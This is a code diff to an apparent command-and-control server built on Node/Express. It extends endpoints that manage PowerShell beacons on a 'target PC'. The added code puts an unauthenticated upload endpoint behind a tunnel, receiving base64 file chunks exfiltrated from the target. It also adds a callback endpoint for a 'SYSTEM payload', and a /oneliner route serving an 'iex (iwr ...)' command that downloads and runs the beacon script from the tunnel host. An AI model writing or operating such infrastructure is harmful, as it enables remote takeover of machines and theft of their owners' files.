@@ -109,7 +109,7 @@ function makeOneShotResolver({ id, extendedTimeoutMs, onTerminate }) {
 const app = express();
 const server = http.createServer(app);
 
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
 
 // Simple auth middleware
 app.use((req, res, next) => {
@@ -152,6 +152,18 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Health check
 app.get('/health', (req, res) => {
   res.json({ status: 'ok', uptime: process.uptime() });
+});
+
+// File upload endpoint — receives base64 chunks from target PC (PC behind tunnel, no auth needed)
+app.post('/api/upload', (req, res) => {
+  const { name, data, append } = req.body || {};
+  if (!name || !data) return res.status(400).json({ error: 'name and data required' });
+  const filePath = path.join('/tmp/opencode/pulls', name.replace(/[^a-zA-Z0-9._-]/g, '_'));
+  if (!fs.existsSync('/tmp/opencode/pulls')) fs.mkdirSync('/tmp/opencode/pulls', { recursive: true });
+  const mode = append ? 'a' : 'w';
+  fs.writeFileSync(filePath, Buffer.from(data, 'base64'), { flag: mode });
+  console.log(`[upload] ${append ? 'Appended' : 'Saved'} chunk to ${filePath}`);
+  res.json({ ok: true, size: Buffer.byteLength(Buffer.from(data, 'base64')) });
 });
 
 // ──────────────────────────────────────────────
@@ -260,9 +272,9 @@ app.post('/api/beacon/command', checkBeaconAuth, async (req, res) => {
 
 // Serve the beacon PowerShell script for easy copy-paste
 app.get('/beacon-script', (req, res) => {
-  reqHost = req.headers.host || 'localhost:3000';
-  const proto = req.headers['x-forwarded-proto'] || req.protocol;
-  reqWsProtocol = proto === 'https' ? 'wss' : 'ws';
+  const tunnelHost = getExternalHost();
+  reqHost = tunnelHost || req.headers.host || 'localhost:3000';
+  reqWsProtocol = 'wss';
   res.type('text/plain').send(getBeaconScript());
 });
 
@@ -413,6 +425,12 @@ app.get('/api/beacon/poll', (req, res) => {
   }
 });
 
+// GET /api/notify — notification endpoint for SYSTEM payload callback
+app.get('/api/notify', (req, res) => {
+  console.log(`[NOTIFY] SYSTEM payload called back! query=${JSON.stringify(req.query)}`);
+  res.json({ ok: true });
+});
+
 // POST /api/beacon/ack — HTTP beacon acknowledges command execution
 app.post('/api/beacon/ack', (req, res) => {
   const { beaconId, id } = req.body || {};
@@ -475,10 +493,9 @@ app.get('/api/beacon/list', (req, res) => {
 
 // Serve the raw one-liner as plain text (no HTML) — for easy copy from browser
 app.get('/oneliner', (req, res) => {
-  reqHost = req.headers.host || 'localhost:3000';
-  const proto = req.headers['x-forwarded-proto'] || req.protocol;
-  const httpProto = proto === 'https' ? 'https' : 'http';
-  const scriptUrl = httpProto + '://' + reqHost + '/beacon-script';
+  const tunnelHost = getExternalHost();
+  const scheme = 'https';
+  const scriptUrl = scheme + '://' + tunnelHost + '/beacon-script';
   const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';
   res.type('text/plain').send(oneLiner);
 });
